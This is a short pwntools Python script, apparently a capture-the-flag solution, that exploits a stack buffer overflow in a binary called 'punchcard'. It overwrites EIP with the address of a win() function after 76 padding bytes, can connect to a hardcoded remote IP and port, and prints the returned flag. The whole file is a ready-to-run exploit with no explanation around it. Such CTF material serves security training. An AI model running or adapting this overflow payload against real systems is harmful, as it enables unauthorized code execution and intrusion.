from pwn import *

context.arch = 'i386'
context.log_level = 'info'

WIN_ADDR = 0x080491d6
OFFSET = 76

def get_process():
    if args.REMOTE:
        host = args.HOST or '222.255.138.122'
        port = int(args.PORT or 10003)
        return remote(host, port)
    return process('./punchcard')

def exploit(p):
    # Buffer overflow into EIP -> win()
    payload = b'A' * OFFSET + p32(WIN_ADDR)
    
    p.recvuntil(b'CARD> ')
    p.sendline(payload)
    
    flag_output = p.recvall(timeout=5).decode(errors='ignore')
    print('=' * 60)
    print(flag_output)
    print('=' * 60)

if __name__ == '__main__':
    p = get_process()
    exploit(p)

